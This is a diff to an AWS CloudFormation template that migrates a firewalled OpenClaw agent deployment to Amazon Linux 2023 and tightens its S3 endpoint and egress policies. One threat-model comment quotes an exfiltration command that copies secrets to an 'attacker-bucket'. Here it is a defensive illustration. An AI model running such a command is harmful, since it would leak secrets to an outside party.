@@ -147,11 +147,11 @@ Conditions:
 
 Mappings:
   ArchitectureMap:
-    t3.small: { Arch: "amd64" }
-    t3.medium: { Arch: "amd64" }
-    t3.large: { Arch: "amd64" }
-    t3.xlarge: { Arch: "amd64" }
-    c5.xlarge: { Arch: "amd64" }
+    t3.small: { Arch: "x86_64" }
+    t3.medium: { Arch: "x86_64" }
+    t3.large: { Arch: "x86_64" }
+    t3.xlarge: { Arch: "x86_64" }
+    c5.xlarge: { Arch: "x86_64" }
     t4g.small: { Arch: "arm64" }
     t4g.medium: { Arch: "arm64" }
     t4g.large: { Arch: "arm64" }
@@ -179,21 +179,6 @@ Mappings:
 
 
 Resources:
-  # ==================== Wait Condition ====================
-  OpenClawWaitHandle:
-    Type: AWS::CloudFormation::WaitConditionHandle
-
-  OpenClawWaitCondition:
-    Type: AWS::CloudFormation::WaitCondition
-    DependsOn: OpenClawInstance
-    Properties:
-      Handle: !Ref OpenClawWaitHandle
-      # 45 min: covers cold-cache first boot on c7g.xlarge (15-25 min npm
-      # install + 5-15 min Network Firewall provisioning) with comfortable
-      # headroom. Smaller instance types may need more — see LEARNINGS.md #24.
-      Timeout: '2700'
-      Count: 1
-
   # ==================== VPC and Network ====================
   OpenClawVPC:
     Type: AWS::EC2::VPC
@@ -331,21 +316,17 @@ Resources:
             pass http any any -> any any (http.host; dotprefix; content:".openai.com"; endswith; msg:"allow .openai.com http"; flow:to_server, established; sid:10008; rev:1;)
             pass tls any any -> any any (tls.sni; dotprefix; content:".chatgpt.com"; endswith; msg:"allow .chatgpt.com (Codex CLI backend)"; flow:to_server, established; sid:10025; rev:1;)
             pass http any any -> any any (http.host; dotprefix; content:".chatgpt.com"; endswith; msg:"allow .chatgpt.com http"; flow:to_server, established; sid:10026; rev:1;)
-            # Cross-region S3 paths only — same-region S3 goes via the gateway VPCE
-            # and never hits the firewall. Covers cfn-bootstrap tarball and AWS CLI
-            # installer (hosted in us-east-1, accessed via global S3 endpoint).
-            pass tls any any -> any any (tls.sni; content:"s3.amazonaws.com"; endswith; msg:"allow s3.amazonaws.com"; flow:to_server, established; sid:10009; rev:1;)
-            pass http any any -> any any (http.host; content:"s3.amazonaws.com"; endswith; msg:"allow s3.amazonaws.com http"; flow:to_server, established; sid:10010; rev:1;)
-            pass tls any any -> any any (tls.sni; content:"awscli.amazonaws.com"; startswith; endswith; msg:"allow awscli.amazonaws.com"; flow:to_server, established; sid:10027; rev:1;)
-            pass http any any -> any any (http.host; content:"awscli.amazonaws.com"; startswith; endswith; msg:"allow awscli.amazonaws.com http"; flow:to_server, established; sid:10028; rev:1;)
-            pass tls any any -> any any (tls.sni; dotprefix; content:".docker.com"; endswith; msg:"allow .docker.com"; flow:to_server, established; sid:10011; rev:1;)
-            pass http any any -> any any (http.host; dotprefix; content:".docker.com"; endswith; msg:"allow .docker.com http"; flow:to_server, established; sid:10012; rev:1;)
+            # Removed in AL2023 migration:
+            # - s3.amazonaws.com / awscli.amazonaws.com (bootstrap artifacts now preinstalled)
+            # - .ubuntu.com (no apt mirrors)
+            # - .docker.com (Ubuntu apt-repo install path; AL2023 installs Docker via
+            #   `dnf install docker` from Amazon Linux mirrors. Docker Hub registry
+            #   pulls use .docker.io, never allow-listed; container pulls from Docker Hub
+            #   already require pre-pulled images or ECR — unchanged.)
             pass tls any any -> any any (tls.sni; dotprefix; content:".npmjs.org"; endswith; msg:"allow .npmjs.org"; flow:to_server, established; sid:10013; rev:1;)
             pass http any any -> any any (http.host; dotprefix; content:".npmjs.org"; endswith; msg:"allow .npmjs.org http"; flow:to_server, established; sid:10014; rev:1;)
             pass tls any any -> any any (tls.sni; dotprefix; content:".nodejs.org"; endswith; msg:"allow .nodejs.org"; flow:to_server, established; sid:10015; rev:1;)
             pass http any any -> any any (http.host; dotprefix; content:".nodejs.org"; endswith; msg:"allow .nodejs.org http"; flow:to_server, established; sid:10016; rev:1;)
-            pass tls any any -> any any (tls.sni; dotprefix; content:".ubuntu.com"; endswith; msg:"allow .ubuntu.com"; flow:to_server, established; sid:10017; rev:1;)
-            pass http any any -> any any (http.host; dotprefix; content:".ubuntu.com"; endswith; msg:"allow .ubuntu.com http"; flow:to_server, established; sid:10018; rev:1;)
             pass tls any any -> any any (tls.sni; dotprefix; content:".pypi.org"; endswith; msg:"allow .pypi.org"; flow:to_server, established; sid:10019; rev:1;)
             pass http any any -> any any (http.host; dotprefix; content:".pypi.org"; endswith; msg:"allow .pypi.org http"; flow:to_server, established; sid:10020; rev:1;)
             pass tls any any -> any any (tls.sni; dotprefix; content:".pythonhosted.org"; endswith; msg:"allow .pythonhosted.org"; flow:to_server, established; sid:10021; rev:1;)
@@ -676,9 +657,13 @@ Resources:
         - !Ref VPCEndpointSecurityGroup
 
   # S3 Gateway VPCE — free, attaches to route tables so the S3 prefix-list
-  # route bypasses the firewall for same-region S3 traffic. Cross-region S3
-  # (e.g. cfn-bootstrap tarball, AWS CLI installer hosted in us-east-1) still
-  # traverses the public path and is handled by a narrowed firewall rule.
+  # route bypasses the firewall for same-region S3 traffic. The PolicyDocument
+  # below restricts the endpoint to read-only access to buckets in this same
+  # AWS account (aws:ResourceAccount), so a compromised agent cannot
+  # `aws s3 cp ./secrets s3://attacker-bucket/` to any other account's bucket
+  # — the request is denied at the VPCE before reaching S3. Cross-region /
+  # cross-account S3 over the public path is now blocked by the firewall
+  # catch-all drop (the wildcard s3.amazonaws.com pass rule was removed).
   S3GatewayVPCEndpoint:
     Type: AWS::EC2::VPCEndpoint
     Condition: CreateEndpoints
@@ -689,6 +674,51 @@ Resources:
       RouteTableIds:
         - !Ref PublicRouteTable
         - !If [EnableFirewall, !Ref PrivateRouteTable, !Ref AWS::NoValue]
+      PolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Sid: AllowReadOnlySameAccount
+            Effect: Allow
+            Principal: "*"
+            Action:
+              - "s3:GetObject"
+              - "s3:GetObjectVersion"
+              - "s3:ListBucket"
+              - "s3:GetBucketLocation"
+            Resource: "*"
+            Condition:
+              StringEquals:
+                aws:ResourceAccount: !Ref AWS::AccountId
+          # AL2023 dnf package repos live in AWS-owned S3 buckets named
+          # `al2023-repos-<region>-<random-suffix>`. We pin to the bucket-name
+          # pattern only. Adding `aws:ResourceAccount` would be defense-in-depth
+          # against an attacker who registers a same-prefix bucket, but the
+          # threat model already excludes that path: dnf reads its repo URLs
+          # from /etc/yum.repos.d/, which the agent (running as ec2-user, no
+          # root) cannot modify, and DNS resolution uses the AWS-managed VPC
+          # resolver. Verifying the AL2023 service account ID for a future
+          # tighter pin:
+          #   aws s3api get-bucket-acl --bucket al2023-repos-<region>-<suffix> --query Owner.ID
+          - Sid: AllowAL2023DnfRepos
+            Effect: Allow
+            Principal: "*"
+            Action:
+              - "s3:GetObject"
+              - "s3:ListBucket"
+              - "s3:GetBucketLocation"
+            Resource:
+              - !Sub "arn:aws:s3:::al2023-repos-${AWS::Region}-*"
+              - !Sub "arn:aws:s3:::al2023-repos-${AWS::Region}-*/*"
+          - Sid: DenyCrossAccount
+            Effect: Deny
+            Principal: "*"
+            Action: "*"
+            NotResource:
+              - !Sub "arn:aws:s3:::al2023-repos-${AWS::Region}-*"
+              - !Sub "arn:aws:s3:::al2023-repos-${AWS::Region}-*/*"
+            Condition:
+              StringNotEquals:
+                aws:ResourceAccount: !Ref AWS::AccountId
 
   # CodeArtifact API: for GetAuthorizationToken, GetRepositoryEndpoint.
   CodeArtifactAPIVPCEndpoint:
@@ -843,7 +873,7 @@ Resources:
           FromPort: 80
           ToPort: 80
           CidrIp: "0.0.0.0/0"
-          Description: "HTTP egress for apt repos (FQDN-filtered by Network Firewall when enabled)"
+          Description: "HTTP egress for package mirrors (FQDN-filtered by Network Firewall when enabled)"
         - IpProtocol: udp
           FromPort: 53
           ToPort: 53
@@ -885,9 +915,15 @@ Resources:
   # ==================== EC2 Instance ====================
   # Note: no DependsOn on firewall resources — they are conditional and CFN errors
   # on DependsOn to resources whose Condition is false. setup.sh waits for
-  # internet reachability before running apt-get, which covers the startup race.
+  # internet reachability before running dnf, which covers the startup race.
   OpenClawInstance:
     Type: AWS::EC2::Instance
+    # 45 min: covers cold-cache first boot on c7g.xlarge (15-25 min npm
+    # install + 5-15 min Network Firewall provisioning) with comfortable
+    # headroom. Smaller instance types may need more — see LEARNINGS.md #24.
+    CreationPolicy:
+      ResourceSignal:
+        Timeout: PT45M
     Metadata:
       AWS::CloudFormation::Init:
         configSets:
@@ -1005,8 +1041,8 @@ Resources:
                 echo ""
                 echo "=========================================="
               mode: "000755"
-              owner: ubuntu
-              group: ubuntu
+              owner: ec2-user
+              group: ec2-user
             /opt/openclaw/setup.sh:
               content:
                 Fn::Sub: |
@@ -1017,8 +1053,6 @@ Resources:
                   echo "=========================================="
                   echo "OpenClaw AWS Native Setup: $(date)"
                   echo "=========================================="
-
-                  export DEBIAN_FRONTEND=noninteractive
 
                   # Mount data volume
                   echo "[0/9] Mounting data volume..."
@@ -1043,38 +1077,42 @@ Resources:
                     grep -q "$DATA_DEVICE" /etc/fstab || \
                       echo "$DATA_DEVICE /data ext4 defaults,nofail 0 2" >> /etc/fstab
                     mkdir -p /data/openclaw
-                    chown ubuntu:ubuntu /data/openclaw
+                    chown ec2-user:ec2-user /data/openclaw
                     # Bind-mount the EBS volume at $HOME/.openclaw. A symlink
                     # would trip OpenClaw's exec-approvals policy, which refuses
                     # to traverse symlinks ("Refusing to traverse symlink in
                     # exec approvals path"). A bind mount makes the path a real
                     # directory backed by /data/openclaw.
-                    if [ -L /home/ubuntu/.openclaw ]; then
-                      rm /home/ubuntu/.openclaw
+                    if [ -L /home/ec2-user/.openclaw ]; then
+                      rm /home/ec2-user/.openclaw
                     fi
-                    mkdir -p /home/ubuntu/.openclaw
-                    chown ubuntu:ubuntu /home/ubuntu/.openclaw
-                    findmnt -M /home/ubuntu/.openclaw >/dev/null 2>&1 || \
-                      mount --bind /data/openclaw /home/ubuntu/.openclaw
-                    grep -q ' /home/ubuntu/.openclaw ' /etc/fstab || \
-                      echo '/data/openclaw /home/ubuntu/.openclaw none bind,nofail,x-systemd.requires=/data 0 0' >> /etc/fstab
+                    mkdir -p /home/ec2-user/.openclaw
+                    chown ec2-user:ec2-user /home/ec2-user/.openclaw
+                    findmnt -M /home/ec2-user/.openclaw >/dev/null 2>&1 || \
+                      mount --bind /data/openclaw /home/ec2-user/.openclaw
+                    grep -q ' /home/ec2-user/.openclaw ' /etc/fstab || \
+                      echo '/data/openclaw /home/ec2-user/.openclaw none bind,nofail,x-systemd.requires=/data 0 0' >> /etc/fstab
                   fi
 
                   # Wait for egress path (Network Firewall endpoint may still be provisioning)
                   echo "[*] Waiting for internet reachability..."
                   for i in $(seq 1 60); do
-                    if curl -s --max-time 5 -o /dev/null -w "%{http_code}" https://archive.ubuntu.com/ | grep -qE "^(2|3)"; then
+                    if curl -s --max-time 5 -o /dev/null -w "%{http_code}" https://api.github.com/ | grep -qE "^(2|3)"; then
                       echo "Internet reachable after $i attempts"
                       break
                     fi
                     sleep 10
                   done
 
-                  # System update
+                  # System update. Fail loudly on dnf errors — AL2023's dnf metadata
+                  # lives in an AWS-owned S3 bucket, and a bad VPCE policy can silently
+                  # 403 every package operation (see LEARNINGS.md #31).
                   echo "[1/9] Updating system..."
-                  apt-get update
-                  apt-get upgrade -y
-                  apt-get install -y unzip curl
+                  dnf upgrade -y || { echo "FATAL: dnf upgrade failed (likely VPCE policy blocking AL2023 repos)"; exit 1; }
+                  # git: required by openclaw plugin enable, which runs `npm install <git-url>`
+                  # for some bundled channel packages. Cloud Ubuntu shipped git by default;
+                  # AL2023 base image does not.
+                  dnf install -y unzip git || { echo "FATAL: dnf install (unzip git) failed"; exit 1; }
 
                   # Detect region and instance ID (IMDSv2)
                   echo "[*] Detecting instance metadata..."
@@ -1097,36 +1135,27 @@ Resources:
                   fi
                   echo "Region: $AWS_REGION | Instance: $INSTANCE_ID"
 
-                  # Install AWS CLI v2
-                  echo "[2/9] Installing AWS CLI..."
-                  curl "https://awscli.amazonaws.com/awscli-exe-linux-$(arch).zip" -o "awscliv2.zip"
-                  unzip -q awscliv2.zip
-                  ./aws/install
-                  rm -rf aws awscliv2.zip
+                  # AWS CLI v2 ships preinstalled on Amazon Linux 2023 — nothing to download.
+                  echo "[2/9] AWS CLI: $(aws --version 2>&1)"
 
-                  # SSM Agent
-                  echo "[3/9] Configuring SSM Agent..."
-                  snap start amazon-ssm-agent || systemctl start amazon-ssm-agent
+                  # SSM Agent ships preinstalled and enabled on Amazon Linux 2023.
+                  echo "[3/9] Ensuring SSM Agent is running..."
+                  systemctl enable --now amazon-ssm-agent || true
 
-                  # Docker (conditional)
+                  # Docker (conditional). Amazon Linux 2023 ships docker in the
+                  # default dnf repo — no third-party apt repo / GPG key dance.
                   if [ "${EnableSandbox}" = "true" ]; then
                     echo "[4/9] Installing Docker..."
-                    install -m 0755 -d /etc/apt/keyrings
-                    curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
-                    chmod a+r /etc/apt/keyrings/docker.asc
-                    echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo "$VERSION_CODENAME") stable" > /etc/apt/sources.list.d/docker.list
-                    apt-get update
-                    apt-get install -y docker-ce docker-ce-cli containerd.io
-                    systemctl enable docker
-                    systemctl start docker
-                    usermod -aG docker ubuntu
+                    dnf install -y docker || { echo "FATAL: dnf install docker failed (EnableSandbox=true)"; exit 1; }
+                    systemctl enable --now docker
+                    usermod -aG docker ec2-user
                   else
                     echo "[4/9] Skipping Docker (EnableSandbox=false)..."
                   fi
 
                   # Install Node.js
                   echo "[5/9] Installing Node.js..."
-                  sudo -u ubuntu bash << 'UBUNTU_SCRIPT'
+                  sudo -u ec2-user bash << 'RUN_AS_EC2_USER'
                   cd ~
                   NVM_VERSION="v0.40.1"
                   for i in 1 2 3; do
@@ -1146,9 +1175,9 @@ Resources:
 
                   # CodeArtifact npm wrapper: shadow the real npm with a
                   # 3-line script that refreshes the auth token on every call.
-                  # No timer, no 12h TTL math — always fresh. Runs as ubuntu
-                  # so .npmrc gets written to /home/ubuntu/.npmrc where the
-                  # gateway (also ubuntu) will read it at runtime-install time.
+                  # No timer, no 12h TTL math — always fresh. Runs as ec2-user
+                  # so .npmrc gets written to /home/ec2-user/.npmrc where the
+                  # gateway (also ec2-user) will read it at runtime-install time.
                   if [ "${UseCodeArtifact}" = "true" ]; then
                     NODE_BIN_DIR=$(dirname $(nvm which default))
                     if [ -f "${!NODE_BIN_DIR}/npm" ] && [ ! -f "${!NODE_BIN_DIR}/npm-real" ]; then
@@ -1200,11 +1229,11 @@ Resources:
                       echo 'export NVM_DIR="$HOME/.nvm"' >> ~/.bashrc
                       echo '[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"' >> ~/.bashrc
                   fi
-                  UBUNTU_SCRIPT
+                  RUN_AS_EC2_USER
 
                   # Create openclaw wrapper
-                  OPENCLAW_MJS=$(find /home/ubuntu/.nvm -path "*/node_modules/openclaw/openclaw.mjs" 2>/dev/null | head -1)
-                  NODE_BIN=$(find /home/ubuntu/.nvm -name node -type f 2>/dev/null | head -1)
+                  OPENCLAW_MJS=$(find /home/ec2-user/.nvm -path "*/node_modules/openclaw/openclaw.mjs" 2>/dev/null | head -1)
+                  NODE_BIN=$(find /home/ec2-user/.nvm -name node -type f 2>/dev/null | head -1)
                   if [ -z "$OPENCLAW_MJS" ] || [ -z "$NODE_BIN" ]; then
                     echo "FATAL: openclaw or node not found"
                     exit 1
@@ -1221,10 +1250,10 @@ Resources:
 
                   # Configure AWS region
                   echo "[6/9] Configuring AWS..."
-                  sudo -u ubuntu mkdir -p /home/ubuntu/.aws
-                  sudo -u ubuntu bash -c "printf '[default]\nregion = %s\noutput = json\n' \"$AWS_REGION\" > /home/ubuntu/.aws/config"
-                  chown -R ubuntu:ubuntu /home/ubuntu/.aws
-                  chmod 600 /home/ubuntu/.aws/config
+                  sudo -u ec2-user mkdir -p /home/ec2-user/.aws
+                  sudo -u ec2-user bash -c "printf '[default]\nregion = %s\noutput = json\n' \"$AWS_REGION\" > /home/ec2-user/.aws/config"
+                  chown -R ec2-user:ec2-user /home/ec2-user/.aws
+                  chmod 600 /home/ec2-user/.aws/config
 
                   # Environment variables
                   echo "[7/9] Configuring environment variables..."
@@ -1234,31 +1263,31 @@ Resources:
                     echo "export AWS_PROFILE=default"
                     echo "export OPENCLAW_MODEL=${OpenClawModel}"
                     echo "export OPENCLAW_USE_BEDROCK=true"
-                  } >> /home/ubuntu/.bashrc
+                  } >> /home/ec2-user/.bashrc
 
-                  sudo -u ubuntu mkdir -p /home/ubuntu/.config/environment.d
-                  sudo -u ubuntu bash -c "{ echo AWS_REGION=$AWS_REGION; echo AWS_DEFAULT_REGION=$AWS_REGION; echo AWS_PROFILE=default; } > /home/ubuntu/.config/environment.d/aws.conf"
+                  sudo -u ec2-user mkdir -p /home/ec2-user/.config/environment.d
+                  sudo -u ec2-user bash -c "{ echo AWS_REGION=$AWS_REGION; echo AWS_DEFAULT_REGION=$AWS_REGION; echo AWS_PROFILE=default; } > /home/ec2-user/.config/environment.d/aws.conf"
 
-                  loginctl enable-linger ubuntu
+                  loginctl enable-linger ec2-user
                   systemctl start user@1000.service
 
                   # Configure OpenClaw
                   echo "[8/9] Configuring OpenClaw..."
-                  sudo -u ubuntu mkdir -p /home/ubuntu/.openclaw
+                  sudo -u ec2-user mkdir -p /home/ec2-user/.openclaw
 
                   # Write .env for Bedrock IAM auth — survives gateway install/reinstall
                   # OpenClaw 2026.4.5+ uses pi-coding-agent which needs AWS_PROFILE
                   # to discover IAM credentials from EC2 instance profile (IMDS)
-                  sudo -u ubuntu bash -c "printf 'AWS_PROFILE=default\nAWS_REGION=$AWS_REGION\nAWS_DEFAULT_REGION=$AWS_REGION\n' > /home/ubuntu/.openclaw/.env"
+                  sudo -u ec2-user bash -c "printf 'AWS_PROFILE=default\nAWS_REGION=$AWS_REGION\nAWS_DEFAULT_REGION=$AWS_REGION\n' > /home/ec2-user/.openclaw/.env"
 
                   GATEWAY_TOKEN=$(openssl rand -hex 24)
 
                   # Modern plugin-based config (plugins.entries with auto-discovery).
                   # See https://github.com/aws-samples/sample-OpenClaw-on-AWS-with-Bedrock/blob/main/UPGRADE.md
-                  cp /opt/openclaw/openclaw-config.json /home/ubuntu/.openclaw/openclaw.json
-                  chown ubuntu:ubuntu /home/ubuntu/.openclaw/openclaw.json
-                  sed -i "s/GATEWAY_TOKEN_PLACEHOLDER/$GATEWAY_TOKEN/g" /home/ubuntu/.openclaw/openclaw.json
-                  sed -i "s|MODEL_ID_PLACEHOLDER|${OpenClawModel}|g" /home/ubuntu/.openclaw/openclaw.json
+                  cp /opt/openclaw/openclaw-config.json /home/ec2-user/.openclaw/openclaw.json
+                  chown ec2-user:ec2-user /home/ec2-user/.openclaw/openclaw.json
+                  sed -i "s/GATEWAY_TOKEN_PLACEHOLDER/$GATEWAY_TOKEN/g" /home/ec2-user/.openclaw/openclaw.json
+                  sed -i "s|MODEL_ID_PLACEHOLDER|${OpenClawModel}|g" /home/ec2-user/.openclaw/openclaw.json
 
                   # Install and start gateway
                   for i in $(seq 1 15); do
@@ -1270,8 +1299,8 @@ Resources:
                     sleep 2
                   done
 
-                  sudo -H -u ubuntu XDG_RUNTIME_DIR=/run/user/1000 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus bash -c '
-                  export HOME=/home/ubuntu
+                  sudo -H -u ec2-user XDG_RUNTIME_DIR=/run/user/1000 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus bash -c '
+                  export HOME=/home/ec2-user
                   export NVM_DIR="$HOME/.nvm"
                   [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
                   openclaw gateway install || echo "Gateway install failed"
@@ -1291,8 +1320,8 @@ Resources:
 
                   if ! ss -tlnp 2>/dev/null | grep -q ':18789'; then
                     echo "WARNING: Gateway did not start, trying fallback..."
-                    sudo -H -u ubuntu XDG_RUNTIME_DIR=/run/user/1000 bash -c '
-                    export HOME=/home/ubuntu
+                    sudo -H -u ec2-user XDG_RUNTIME_DIR=/run/user/1000 bash -c '
+                    export HOME=/home/ec2-user
                     export NVM_DIR="$HOME/.nvm"
                     [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
                     systemctl --user restart openclaw-gateway.service || openclaw gateway &
@@ -1302,8 +1331,8 @@ Resources:
 
                   # Enable messaging channels
                   echo "[8.5/9] Enabling messaging channels..."
-                  sudo -H -u ubuntu bash -c '
-                  export HOME=/home/ubuntu
+                  sudo -H -u ec2-user bash -c '
+                  export HOME=/home/ec2-user
                   export NVM_DIR="$HOME/.nvm"
                   [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
                   openclaw plugins enable whatsapp || echo "WhatsApp plugin enable failed"
@@ -1315,8 +1344,8 @@ Resources:
                   '
 
                   # Copy SOUL.md
-                  cp /opt/openclaw/SOUL.md /home/ubuntu/.openclaw/SOUL.md
-                  chown ubuntu:ubuntu /home/ubuntu/.openclaw/SOUL.md
+                  cp /opt/openclaw/SOUL.md /home/ec2-user/.openclaw/SOUL.md
+                  chown ec2-user:ec2-user /home/ec2-user/.openclaw/SOUL.md
 
                   # Save token to SSM Parameter Store
                   STACK_NAME="${AWS::StackName}"
@@ -1329,29 +1358,47 @@ Resources:
                   unset GATEWAY_TOKEN
 
                   # Save instance info
-                  echo "$INSTANCE_ID" > /home/ubuntu/.openclaw/instance_id.txt
-                  echo "$AWS_REGION" > /home/ubuntu/.openclaw/region.txt
+                  echo "$INSTANCE_ID" > /home/ec2-user/.openclaw/instance_id.txt
+                  echo "$AWS_REGION" > /home/ec2-user/.openclaw/region.txt
 
                   # Copy SSM access script
-                  cp /opt/openclaw/ssm-portforward.sh /home/ubuntu/ssm-portforward.sh
-                  chown ubuntu:ubuntu /home/ubuntu/ssm-portforward.sh
+                  cp /opt/openclaw/ssm-portforward.sh /home/ec2-user/ssm-portforward.sh
+                  chown ec2-user:ec2-user /home/ec2-user/ssm-portforward.sh
 
-                  # Signal CloudFormation
+                  # Signal CloudFormation via the CFN service API (CreationPolicy.ResourceSignal).
+                  # No S3 PUT, no AWS-owned bucket dependency; goes through the CloudFormation
+                  # interface VPCE. SignalResource is idempotent (deduped by --id), so retries
+                  # are safe across transient network blips.
                   echo "[9/9] Signaling CloudFormation..."
-                  echo "SUCCESS" > /home/ubuntu/.openclaw/setup_status.txt
-                  echo "Setup completed: $(date)" >> /home/ubuntu/.openclaw/setup_status.txt
+                  echo "SUCCESS" > /home/ec2-user/.openclaw/setup_status.txt
+                  echo "Setup completed: $(date)" >> /home/ec2-user/.openclaw/setup_status.txt
 
-                  # Read token back from SSM for cfn-signal (so CloudFormation Outputs can build the access URL)
-                  CFN_TOKEN=$(aws ssm get-parameter --name "/openclaw/$STACK_NAME/gateway-token" --with-decryption --query Parameter.Value --output text --region $AWS_REGION 2>/dev/null || echo "TOKEN_UNAVAILABLE")
-
-                  CFN_SIGNAL=$(which cfn-signal 2>/dev/null || find /usr -name cfn-signal 2>/dev/null | head -1)
-                  if [ -n "$CFN_SIGNAL" ]; then
-                    $CFN_SIGNAL -e 0 -d "$CFN_TOKEN" -r "OpenClaw ready" '${OpenClawWaitHandle}'
-                  else
-                    SIGNAL_JSON="{\"Status\":\"SUCCESS\",\"Reason\":\"OpenClaw ready\",\"UniqueId\":\"openclaw\",\"Data\":\"$CFN_TOKEN\"}"
-                    curl -X PUT -H "Content-Type:" --data-binary "$SIGNAL_JSON" "${OpenClawWaitHandle}"
+                  CFN_SIGNAL=$(which cfn-signal 2>/dev/null || echo /opt/aws/bin/cfn-signal)
+                  if [ ! -x "$CFN_SIGNAL" ]; then
+                    echo "FATAL: cfn-signal not found"
+                    exit 1
                   fi
-                  unset CFN_TOKEN
+
+                  attempt=1
+                  wait_time=5
+                  while [ "$attempt" -le 5 ]; do
+                    echo "Signal attempt $attempt/5..."
+                    if "$CFN_SIGNAL" -e 0 \
+                        --stack "${AWS::StackName}" \
+                        --resource OpenClawInstance \
+                        --region "$AWS_REGION"; then
+                      echo "Signal sent successfully"
+                      break
+                    fi
+                    if [ "$attempt" -eq 5 ]; then
+                      echo "FATAL: cfn-signal failed after 5 attempts; CreationPolicy timeout will roll back the stack"
+                      exit 1
+                    fi
+                    echo "Signal failed, retrying in ${!wait_time}s..."
+                    sleep "$wait_time"
+                    attempt=$((attempt + 1))
+                    wait_time=$((wait_time * 2))
+                  done
 
                   echo "=========================================="
                   echo "OpenClaw installation complete!"
@@ -1365,8 +1412,8 @@ Resources:
               command: "/opt/openclaw/setup.sh"
               ignoreErrors: false
     Properties:
-      ImageId: !Sub 
-        - '{{resolve:ssm:/aws/service/canonical/ubuntu/server/24.04/stable/current/${Arch}/hvm/ebs-gp3/ami-id}}'
+      ImageId: !Sub
+        - '{{resolve:ssm:/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-${Arch}}}'
         - Arch: !FindInMap [ArchitectureMap, !Ref InstanceType, Arch]
       InstanceType: !Ref InstanceType
       KeyName: !If [HasKeyPair, !Ref KeyPairName, !Ref "AWS::NoValue"]
@@ -1393,39 +1440,27 @@ Resources:
       UserData:
         Fn::Base64: !Sub |
           #!/bin/bash
-          # Minimal bootstrap — installs cfn-init, then delegates to Metadata::Init
+          # Minimal bootstrap — Amazon Linux 2023 ships aws-cfn-bootstrap and
+          # awscli v2 preinstalled, so we just need to wait for egress and
+          # delegate to Metadata::Init via cfn-init.
           set -e
           exec > >(tee /var/log/openclaw-bootstrap.log) 2>&1
           echo "Bootstrap start: $(date)"
-          export DEBIAN_FRONTEND=noninteractive
 
-          # Wait for egress path to be ready before calling apt/pip.
-          # When Network Firewall is enabled, the firewall endpoint can take
-          # 10-15 minutes to become ACTIVE after the instance has booted.
+          # Wait for egress. Network Firewall endpoint can take 10-15 minutes
+          # to become ACTIVE after the instance has booted.
           echo "Waiting for internet reachability..."
           for i in $(seq 1 120); do
-            if curl -s --max-time 5 -o /dev/null https://archive.ubuntu.com/; then
+            if curl -s --max-time 5 -o /dev/null https://api.github.com/; then
               echo "Internet reachable after $i attempts"
               break
             fi
             sleep 10
           done
 
-          # Ubuntu 24.04 AMIs default to the regional EC2 mirror
-          # (e.g. eu-west-1.ec2.ports.ubuntu.com), which does not respond when the
-          # instance sits behind NAT Gateway + Network Firewall. Rewrite sources
-          # to the canonical mirror, which does respond. Covers DEB822 and legacy.
-          for f in /etc/apt/sources.list.d/ubuntu.sources /etc/apt/sources.list; do
-            [ -f "$f" ] || continue
-            sed -i -E 's#[a-z0-9-]+\.ec2\.(archive|ports)\.ubuntu\.com#\1.ubuntu.com#g' "$f"
-          done
-
-          apt-get update -q
-          apt-get install -y -q python3-pip
-          pip3 install --break-system-packages https://s3.amazonaws.com/cloudformation-examples/aws-cfn-bootstrap-py3-latest.tar.gz
-          CFN_INIT=$(which cfn-init 2>/dev/null || find /usr -name cfn-init 2>/dev/null | head -1)
-          if [ -z "$CFN_INIT" ]; then
-            echo "FATAL: cfn-init not found after install"
+          CFN_INIT=$(which cfn-init 2>/dev/null || echo /opt/aws/bin/cfn-init)
+          if [ ! -x "$CFN_INIT" ]; then
+            echo "FATAL: cfn-init not found (expected on AL2023 via aws-cfn-bootstrap RPM)"
             exit 1
           fi
           echo "Running cfn-init..."
@@ -1437,7 +1472,7 @@ Resources:
 
 Outputs:
   Step1InstallSSMPlugin:
-    Description: "STEP 1: Install SSM Session Manager Plugin on your local computer (Option 2: go to EC2 Console > right-click instance > Connect > Session Manager to get a shell, then run 'sudo su - ubuntu && openclaw gateway status' to set up IM channels)"
+    Description: "STEP 1: Install SSM Session Manager Plugin on your local computer (Option 2: go to EC2 Console > right-click instance > Connect > Session Manager to get a shell, then run 'sudo su - ec2-user && openclaw gateway status' to set up IM channels)"
     Value: "https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html"
 
   Step2PortForwarding:
@@ -1446,10 +1481,9 @@ Outputs:
       aws ssm start-session --target ${OpenClawInstance} --region ${AWS::Region} --document-name AWS-StartPortForwardingSession --parameters '{"portNumber":["18789"],"localPortNumber":["18789"]}'
 
   Step3AccessURL:
-    Description: "STEP 3: Open this URL in browser"
-    Value: !Sub
-      - "http://localhost:18789/?token=${Token}"
-      - Token: !Select [3, !Split ['"', !GetAtt OpenClawWaitCondition.Data]]
+    Description: "STEP 3: Run this command on your LOCAL computer (requires ssm:GetParameter on /openclaw/<stack>/*) to fetch the gateway token and print the access URL."
+    Value: !Sub |-
+      TOKEN=$(aws ssm get-parameter --name /openclaw/${AWS::StackName}/gateway-token --with-decryption --query Parameter.Value --output text --region ${AWS::Region}) && echo "http://localhost:18789/?token=$TOKEN"
 
   Step4StartChatting:
     Description: "STEP 4: Start using OpenClaw!"
